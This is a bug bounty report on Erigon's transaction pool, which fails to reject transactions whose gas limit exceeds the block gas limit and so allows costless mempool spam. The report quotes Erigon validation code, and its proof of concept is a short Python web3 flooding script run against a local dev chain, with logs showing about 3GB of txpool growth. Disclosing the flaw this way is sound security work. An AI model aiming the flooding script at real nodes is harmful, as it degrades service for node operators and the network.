# #38278 \[BC-Low] Potential DoS to Mempool Due to Missing Gas Limit Check

**Submitted on Dec 29th 2024 at 23:47:22 UTC by @CertiK for** [**Attackathon | Ethereum Protocol**](https://immunefi.com/audit-competition/ethereum-protocol-attackathon)

* **Report ID:** #38278
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/ledgerwatch/erigon>
* **Impacts:**
  * (Specifications) A bug in specifications with no direct impact on client implementations

## Description

## Brief/Intro

The transaction validation misses the check of the gas limit in a transaction when entering the mempool (txpool). In case that the transaction of gas limit is more than the block gas limit, the transaction will never be included in a block, which should be discarded immediately.

However, the Erigon client misses such a check which allows these types of spam transactions to enter into the mempool. Since there is no cost to the attackers submitting such transactions, it would lead to the potential DoS attack to the Erigon mempool as it would consume a lot of computing resources.

## Vulnerability Details

The transaction validation when entering the mempool (txpool) is performed within multiple functions:

* `ValidateSerializedTxn()`
* `ValidateTx()`
* `ParseTransaction()`

However, there is no check on the gas limit in the transaction, which should be less than the block gas limit; Otherwise, it will never be mined to a block.

<https://github.com/erigontech/erigon/blob/v3.0.0-alpha7/txnprovider/txpool/pool.go#L1037>

```
// Check that the serialized txn should not exceed a certain max size
func (p *TxPool) ValidateSerializedTxn(serializedTxn []byte) error {
	const (
		// txnSlotSize is used to calculate how many data slots a single transaction
		// takes up based on its size. The slots are used as DoS protection, ensuring
		// that validating a new transaction remains a constant operation (in reality
		// O(maxslots), where max slots are 4 currently).
		txnSlotSize = 32 * 1024


		// txnMaxSize is the maximum size a single transaction can have. This field has
		// non-trivial consequences: larger transactions are significantly harder and
		// more expensive to propagate; larger transactions also take more resources
		// to validate whether they fit into the pool or not.
		txnMaxSize = 4 * txnSlotSize // 128KB


		// Should be enough for a transaction with 6 blobs
		blobTxnMaxSize = 800_000
	)
	txnType, err := PeekTransactionType(serializedTxn)
	if err != nil {
		return err
	}
	maxSize := txnMaxSize
	if txnType == BlobTxnType {
		maxSize = blobTxnMaxSize
	}
	if len(serializedTxn) > maxSize {
		return ErrRlpTooBig
	}
	return nil
}
```

<https://github.com/erigontech/erigon/blob/v3.0.0-alpha7/txnprovider/txpool/pool.go#L815>

```
func (p *TxPool) validateTx(txn *TxnSlot, isLocal bool, stateCache kvcache.CacheView) txpoolcfg.DiscardReason {
	isShanghai := p.isShanghai() || p.isAgra()
	if isShanghai && txn.Creation && txn.DataLen > fixedgas.MaxInitCodeSize {
		return txpoolcfg.InitCodeTooLarge // EIP-3860
	}
	if txn.Type == BlobTxnType {
		if !p.isCancun() {
			return txpoolcfg.TypeNotActivated
		}
		if txn.Creation {
			return txpoolcfg.InvalidCreateTxn
		}
		blobCount := uint64(len(txn.BlobHashes))
		if blobCount == 0 {
			return txpoolcfg.NoBlobs
		}
		if blobCount > p.maxBlobsPerBlock {
			return txpoolcfg.TooManyBlobs
		}
		equalNumber := len(txn.BlobHashes) == len(txn.Blobs) &&
			len(txn.Blobs) == len(txn.Commitments) &&
			len(txn.Commitments) == len(txn.Proofs)


		if !equalNumber {
			return txpoolcfg.UnequalBlobTxExt
		}


		for i := 0; i < len(txn.Commitments); i++ {
			if libkzg.KZGToVersionedHash(txn.Commitments[i]) != libkzg.VersionedHash(txn.BlobHashes[i]) {
				return txpoolcfg.BlobHashCheckFail
			}
		}


		// https://github.com/ethereum/consensus-specs/blob/017a8495f7671f5fff2075a9bfc9238c1a0982f8/specs/deneb/polynomial-commitments.md#verify_blob_kzg_proof_batch
		kzgCtx := libkzg.Ctx()
		err := kzgCtx.VerifyBlobKZGProofBatch(toBlobs(txn.Blobs), txn.Commitments, txn.Proofs)
		if err != nil {
			return txpoolcfg.UnmatchedBlobTxExt
		}


		if !isLocal && (p.all.blobCount(txn.SenderID)+uint64(len(txn.BlobHashes))) > p.cfg.BlobSlots {
			if txn.Traced {
				p.logger.Info(fmt.Sprintf("TX TRACING: validateTx marked as spamming (too many blobs) idHash=%x slots=%d, limit=%d", txn.IDHash, p.all.count(txn.SenderID), p.cfg.AccountSlots))
			}
			return txpoolcfg.Spammer
		}
		if p.totalBlobsInPool.Load() >= p.cfg.TotalBlobPoolLimit {
			if txn.Traced {
				p.logger.Info(fmt.Sprintf("TX TRACING: validateTx total blobs limit reached in pool limit=%x current blobs=%d", p.cfg.TotalBlobPoolLimit, p.totalBlobsInPool.Load()))
			}
			return txpoolcfg.BlobPoolOverflow
		}
	}


	authorizationLen := len(txn.Authorizations)
	if txn.Type == SetCodeTxnType {
		if !p.isPrague() {
			return txpoolcfg.TypeNotActivated
		}
		if txn.Creation {
			return txpoolcfg.InvalidCreateTxn
		}
		if authorizationLen == 0 {
			return txpoolcfg.NoAuthorizations
		}
	}


	// Drop non-local transactions under our own minimal accepted gas price or tip
	if !isLocal && uint256.NewInt(p.cfg.MinFeeCap).Cmp(&txn.FeeCap) == 1 {
		if txn.Traced {
			p.logger.Info(fmt.Sprintf("TX TRACING: validateTx underpriced idHash=%x local=%t, feeCap=%d, cfg.MinFeeCap=%d", txn.IDHash, isLocal, txn.FeeCap, p.cfg.MinFeeCap))
		}
		return txpoolcfg.UnderPriced
	}
	gas, reason := txpoolcfg.CalcIntrinsicGas(uint64(txn.DataLen), uint64(txn.DataNonZeroLen), uint64(authorizationLen), nil, txn.Creation, true, true, isShanghai)
	if txn.Traced {
		p.logger.Info(fmt.Sprintf("TX TRACING: validateTx intrinsic gas idHash=%x gas=%d", txn.IDHash, gas))
	}
	if reason != txpoolcfg.Success {
		if txn.Traced {
			p.logger.Info(fmt.Sprintf("TX TRACING: validateTx intrinsic gas calculated failed idHash=%x reason=%s", txn.IDHash, reason))
		}
		return reason
	}
	if gas > txn.Gas {
		if txn.Traced {
			p.logger.Info(fmt.Sprintf("TX TRACING: validateTx intrinsic gas > txn.gas idHash=%x gas=%d, txn.gas=%d", txn.IDHash, gas, txn.Gas))
		}
		return txpoolcfg.IntrinsicGas
	}
	if !isLocal && uint64(p.all.count(txn.SenderID)) > p.cfg.AccountSlots {
		if txn.Traced {
			p.logger.Info(fmt.Sprintf("TX TRACING: validateTx marked as spamming idHash=%x slots=%d, limit=%d", txn.IDHash, p.all.count(txn.SenderID), p.cfg.AccountSlots))
		}
		return txpoolcfg.Spammer
	}


	// Check nonce and balance
	senderNonce, senderBalance, _ := p.senders.info(stateCache, txn.SenderID)
	if senderNonce > txn.Nonce {
		if txn.Traced {
			p.logger.Info(fmt.Sprintf("TX TRACING: validateTx nonce too low idHash=%x nonce in state=%d, txn.nonce=%d", txn.IDHash, senderNonce, txn.Nonce))
		}
		return txpoolcfg.NonceTooLow
	}
	// Transactor should have enough funds to cover the costs
	total := requiredBalance(txn)
	if senderBalance.Cmp(total) < 0 {
		if txn.Traced {
			p.logger.Info(fmt.Sprintf("TX TRACING: validateTx insufficient funds idHash=%x balance in state=%d, txn.gas*txn.tip=%d", txn.IDHash, senderBalance, total))
		}
		return txpoolcfg.InsufficientFunds
	}
	return txpoolcfg.Success
}
```

<https://github.com/erigontech/erigon/blob/34714c0c25cc59587240ae7abc1c2758315254af/txnprovider/txpool/pool\\_txn\\_parser.go#L125C29-L125C45>

```
func (ctx *TxnParseContext) ParseTransaction(payload []byte, pos int, slot *TxnSlot, sender []byte, hasEnvelope, wrappedWithBlobs bool, validateHash func([]byte) error) (p int, err error) {
	if len(payload) == 0 {
		return 0, fmt.Errorf("%w: empty rlp", ErrParseTxn)
	}
	if ctx.withSender && len(sender) != 20 {
		return 0, fmt.Errorf("%w: expect sender buffer of len 20", ErrParseTxn)
	}

	// Legacy transactions have list Prefix, whereas EIP-2718 transactions have string Prefix
	// therefore we assign the first returned value of Prefix function (list) to legacy variable
	dataPos, dataLen, legacy, err := rlp.Prefix(payload, pos)
	if err != nil {
		return 0, fmt.Errorf("%w: size Prefix: %s", ErrParseTxn, err) //nolint
	}
	// This handles the transactions coming from other Erigon peers of older versions, which add 0x80 (empty) transactions into packets
	if dataLen == 0 {
		return 0, fmt.Errorf("%w: transaction must be either 1 list or 1 string", ErrParseTxn)
	}
	if dataLen == 1 && !legacy {
		if hasEnvelope {
			return 0, fmt.Errorf("%w: expected envelope in the payload, got %x", ErrParseTxn, payload[dataPos:dataPos+dataLen])
		}
	}

	p = dataPos

	var wrapperDataPos, wrapperDataLen int

	// If it is non-legacy transaction, the transaction type follows, and then the list
	if !legacy {
		slot.Type = payload[p]
		if slot.Type > SetCodeTxnType {
			return 0, fmt.Errorf("%w: unknown transaction type: %d", ErrParseTxn, slot.Type)
		}
		p++
		if p >= len(payload) {
			return 0, fmt.Errorf("%w: unexpected end of payload after txnType", ErrParseTxn)
		}
		dataPos, dataLen, err = rlp.ParseList(payload, p)
		if err != nil {
			return 0, fmt.Errorf("%w: envelope Prefix: %s", ErrParseTxn, err) //nolint
		}
		// For legacy transaction, the entire payload in expected to be in "rlp" field
		// whereas for non-legacy, only the content of the envelope (start with position p)
		slot.Rlp = payload[p-1 : dataPos+dataLen]

		if slot.Type == BlobTxnType && wrappedWithBlobs {
			p = dataPos
			wrapperDataPos = dataPos
			wrapperDataLen = dataLen
			dataPos, dataLen, err = rlp.ParseList(payload, dataPos)
			if err != nil {
				return 0, fmt.Errorf("%w: wrapped blob tx: %s", ErrParseTxn, err) //nolint
			}
		}
	} else {
		slot.Type = LegacyTxnType
		slot.Rlp = payload[pos : dataPos+dataLen]
	}

	p, err = ctx.parseTransactionBody(payload, pos, p, slot, sender, validateHash)
	if err != nil {
		return p, err
	}

	if slot.Type == BlobTxnType && wrappedWithBlobs {
		if p != dataPos+dataLen {
			return 0, fmt.Errorf("%w: unexpected leftover after blob txn body", ErrParseTxn)
		}

		dataPos, dataLen, err = rlp.ParseList(payload, p)
		if err != nil {
			return 0, fmt.Errorf("%w: blobs len: %s", ErrParseTxn, err) //nolint
		}
		blobPos := dataPos
		for blobPos < dataPos+dataLen {
			blobPos, err = rlp.StringOfLen(payload, blobPos, fixedgas.BlobSize)
			if err != nil {
				return 0, fmt.Errorf("%w: blob: %s", ErrParseTxn, err) //nolint
			}
			slot.Blobs = append(slot.Blobs, payload[blobPos:blobPos+fixedgas.BlobSize])
			blobPos += fixedgas.BlobSize
		}
		if blobPos != dataPos+dataLen {
			return 0, fmt.Errorf("%w: extraneous space in blobs", ErrParseTxn)
		}
		p = blobPos

		dataPos, dataLen, err = rlp.ParseList(payload, p)
		if err != nil {
			return 0, fmt.Errorf("%w: commitments len: %s", ErrParseTxn, err) //nolint
		}
		commitmentPos := dataPos
		for commitmentPos < dataPos+dataLen {
			commitmentPos, err = rlp.StringOfLen(payload, commitmentPos, 48)
			if err != nil {
				return 0, fmt.Errorf("%w: commitment: %s", ErrParseTxn, err) //nolint
			}
			var commitment gokzg4844.KZGCommitment
			copy(commitment[:], payload[commitmentPos:commitmentPos+48])
			slot.Commitments = append(slot.Commitments, commitment)
			commitmentPos += 48
		}
		if commitmentPos != dataPos+dataLen {
			return 0, fmt.Errorf("%w: extraneous space in commitments", ErrParseTxn)
		}
		p = commitmentPos

		dataPos, dataLen, err = rlp.ParseList(payload, p)
		if err != nil {
			return 0, fmt.Errorf("%w: proofs len: %s", ErrParseTxn, err) //nolint
		}
		proofPos := dataPos
		for proofPos < dataPos+dataLen {
			proofPos, err = rlp.StringOfLen(payload, proofPos, 48)
			if err != nil {
				return 0, fmt.Errorf("%w: proof: %s", ErrParseTxn, err) //nolint
			}
			var proof gokzg4844.KZGProof
			copy(proof[:], payload[proofPos:proofPos+48])
			slot.Proofs = append(slot.Proofs, proof)
			proofPos += 48
		}
		if proofPos != dataPos+dataLen {
			return 0, fmt.Errorf("%w: extraneous space in proofs", ErrParseTxn)
		}
		p = proofPos

		if p != wrapperDataPos+wrapperDataLen {
			return 0, fmt.Errorf("%w: extraneous elements in blobs wrapper", ErrParseTxn)
		}
	}

	slot.Size = uint32(len(slot.Rlp))

	return p, err
}
```

The Ergion mempool consists of a pending subpool, basefee subpool and queued subpool, which has the current default configuration that allows `10_000`, `30_000`, `30_000` transactions, respectively.

<https://github.com/erigontech/erigon/blob/v3.0.0-alpha7/txnprovider/txpool/txpoolcfg/txpoolcfg.go#L66>

```
var DefaultConfig = Config{
	SyncToNewPeersEvery:    5 * time.Second,
	ProcessRemoteTxnsEvery: 100 * time.Millisecond,
	CommitEvery:            15 * time.Second,
	LogEvery:               30 * time.Second,

	PendingSubPoolLimit: 10_000,
	BaseFeeSubPoolLimit: 30_000,
	QueuedSubPoolLimit:  30_000,

	MinFeeCap:          1,
	AccountSlots:       16,  // TODO: to choose right value (16 to be compatible with Geth)
	BlobSlots:          48,  // Default for a total of 8 txns for 6 blobs each - for hive tests
	TotalBlobPoolLimit: 480, // Default for a total of 10 different accounts hitting the above limit
	PriceBump:          10,  // Price bump percentage to replace an already existing transaction
	BlobPriceBump:      100,

	NoGossip:     false,
	MdbxWriteMap: false,
}
```

A transaction could have at most 128KB, and \~800KB for blob transactions, the mempool could consume **tens of gigabytes of memory and storage** via submitting these spam transactions with more than block gas limit (30M). Since the gas limit could be set as large as possible, the transaction size can be close to the thresholds, 128KB and \~800KB for blob transactions.

<https://github.com/erigontech/erigon/blob/34714c0c25cc59587240ae7abc1c2758315254af/txnprovider/txpool/pool.go#L1038C1-L1053C3>

```
	const (
		// txnSlotSize is used to calculate how many data slots a single transaction
		// takes up based on its size. The slots are used as DoS protection, ensuring
		// that validating a new transaction remains a constant operation (in reality
		// O(maxslots), where max slots are 4 currently).
		txnSlotSize = 32 * 1024

		// txnMaxSize is the maximum size a single transaction can have. This field has
		// non-trivial consequences: larger transactions are significantly harder and
		// more expensive to propagate; larger transactions also take more resources
		// to validate whether they fit into the pool or not.
		txnMaxSize = 4 * txnSlotSize // 128KB

		// Should be enough for a transaction with 6 blobs
		blobTxnMaxSize = 800_000
	)
```

Though the txpool has some constraints to mitigate the spam transactions, for example, with 3 subpools and using nonce distance (gap), cumulative balance distance and timestamp as priority queue to discard transactions .

As the attack is costless, the attacker could submit numerous spam transactions of gas limit larger than block gas limit (30M) from different accounts.

## Impact Details

Missing transaction gas limit check against the block gas limit would potentially lead to the DoS attack to Ergion mempool as it consumes a lot of computing resources without any cost to the attackers. These spam transactions will also be propagated to other Erigon nodes, which could possibly lead to a similar DoS attack.

## References

* <https://github.com/erigontech/erigon/releases/tag/v3.0.0-alpha7>

## Proof of Concept

## Proof of Concept

For simplicity, we spin up an Erigon dev chain according to the instructions, detailed in the documentation: <https://github.com/erigontech/erigon/blob/release/2.60/DEV\\_CHAIN.md> .

**Note:** the test does not demonstrate the worst scenario, as the tx size limit has not been reached and the blob transaction is not used.

1. Submit spam transaction using Python web3 script with gas limit 300\_000\_000 (> block gas limit 30M):

```
from web3 import Web3
from eth_account import Account
import os


# Connect to local node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))


# Your private key (better to use environment variable)
private_key = '26e86e45f6fc45ec6e2ecd128cec80fa1d1505e5507dcd2ae58c3130a7a97b48'  
account = Account.from_key(private_key)

initial_data_size = 100_000  # tx data size
data = os.urandom(initial_data_size)


for n in range(30010):
    # Prepare transaction
    transaction = {
        'nonce': w3.eth.get_transaction_count(account.address) + n,
        'to': '0xa94f5374Fce5edBC8E2a8697C15331677e6EbF0B',
        'value': w3.to_wei(0.0, 'ether'),  # sending 1 ETH
        'gas': 300000000,
        'gasPrice': w3.eth.gas_price,
        'chainId': w3.eth.chain_id,
        'data': data
    }


    # Sign transaction
    signed_txn = w3.eth.account.sign_transaction(transaction, private_key)


    # Send transaction
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
```

2. The log shows that the memory allocation jumps up to 100MB with 10 spam transactions,

```
INFO[12-28|14:08:38.700] [mem] memory stats                       alloc=32.1MB sys=60.3MB
INFO[12-28|14:08:38.716] [txpool] stat                            pending=1 baseFee=0 queued=0 alloc=32.1MB sys=60.3MB

INFO[12-28|14:11:38.703] [mem] memory stats                       alloc=77.3MB sys=169.8MB
INFO[12-28|14:11:38.719] [txpool] stat                            pending=1 baseFee=0 queued=10 alloc=77.3MB sys=169.8MB
```

3. and eventually the txpool consumes around 3GB storage:

```
du -sh * | sort -hr
3.3G	txpool
 34M	nodes
 17M	downloader
 17M	clique
 17M	chaindata
5.0M	diagnostics
 44K	logs
 16K	snapshots
 12K	migrations
8.0K	caplin
4.0K	nodekey
4.0K	jwt.hex
  0B	temp
  0B	LOCK
```
